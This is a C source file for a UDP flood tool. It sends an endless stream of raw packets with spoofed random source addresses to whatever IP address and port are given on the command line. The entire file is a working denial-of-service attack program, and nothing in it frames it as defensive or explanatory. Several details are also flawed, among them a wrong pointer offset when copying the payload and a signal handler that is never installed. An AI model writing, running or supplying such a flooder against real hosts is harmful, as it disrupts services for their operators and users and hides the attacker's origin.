#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h> 
#include <errno.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

struct pseudoHdr
{
	unsigned int scrAddr;
	unsigned int destAddr;
	unsigned char placeHolder;
	unsigned char protocol;
	unsigned short udpLen;
};

static int alive;
int st;
char dst_ip[16];
int dst_port;

void sig_int(int signo)
{
	alive = 0;
}

unsigned short checksum(unsigned short *buffer, int size) 
{
	unsigned long cksum = 0;	
	while(size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(unsigned short);
	}
	if(size)
	{
		cksum += *(unsigned char *)buffer;
	}	
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);		
	return((unsigned short )(~cksum));
}

void udpflood(struct sockaddr_in *addr)
{
	char *data="Too young, too simple! Sometimes naive!!";
	int dataLen = strlen(data);
	int udpLen = sizeof(struct udphdr) + dataLen;
	int ipLen = sizeof(struct iphdr) + udpLen;
	
	char sendbuf[4096], buf[4096];
	struct iphdr *ipHdr = (struct iphdr*)sendbuf;
	struct udphdr *udpHdr = (struct udphdr*)(sendbuf + sizeof(struct iphdr));
	struct pseudoHdr psHdr;
	
	srand((unsigned)time(NULL));
	
	while (alive)
	{
		bzero(sendbuf, sizeof(sendbuf));
			
		ipHdr->version = 4;
		ipHdr->ihl = sizeof(struct iphdr)/sizeof(unsigned int);
		ipHdr->tos = 0;
		ipHdr->tot_len = htons(ipLen);
		ipHdr->id = rand()%64;
		ipHdr->frag_off = 0;
		ipHdr->ttl = rand()%32 + 64;
		ipHdr->protocol = IPPROTO_UDP;
		ipHdr->check = 0;
		ipHdr->daddr = inet_addr(dst_ip);
		ipHdr->saddr = rand();

		udpHdr->source = htons(rand()%16383+49152);
		udpHdr->dest = htons(dst_port);
		udpHdr->len = htons(udpLen);
		udpHdr->check = 0;
	
		if(dataLen > 0)
		{
			memcpy(udpHdr+sizeof(struct udphdr), data, dataLen); 
		}

		psHdr.scrAddr = ipHdr->saddr;
		psHdr.destAddr = ipHdr->daddr;	
		psHdr.placeHolder = 0;
		psHdr.protocol = IPPROTO_UDP;
		psHdr.udpLen = htons(udpLen);
	
		ipHdr->check = checksum((unsigned short *)sendbuf, sizeof(struct iphdr));
	
		bzero(buf, sizeof(buf));
		memcpy(buf, (char*)&psHdr, sizeof(struct pseudoHdr));
		memcpy(buf+sizeof(struct pseudoHdr), udpHdr, udpLen);
		udpHdr->check = checksum((unsigned short*)buf, sizeof(struct pseudoHdr)+udpLen);
    
		if (sendto(st, sendbuf, ipLen, 0, (struct sockaddr*)addr, sizeof(struct sockaddr)) < 0)
		{
			perror("sendto()");
		}
	}
}


int main(int argc, char* argv[])
{
	struct sockaddr_in addr;
	int on = 1;
	
	alive = 1;
	if(argc < 3)
	{
		printf("usage: syn <IPaddress> <Port>\n");
		exit(1);
	}
	strncpy(dst_ip, argv[1], 16);
	dst_port = atoi(argv[2]);
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(dst_port);
	addr.sin_addr.s_addr = inet_addr(dst_ip);
	if( dst_port < 0 || dst_port > 65535 )
	{
		printf("Port Error\n");
		exit(1);
	}
	if((st = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0)
	{
		perror("socket()");
		exit(1);
	}
	if(setsockopt(st, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on))<0){
		perror("setsockopt()");
		exit(1);
	}
	setuid(getpid());	
	printf("\n udpflood starts...\n");
	udpflood(&addr);
	printf("\n udpflood stops...\n");	
	close(st);
	
	return 0;
}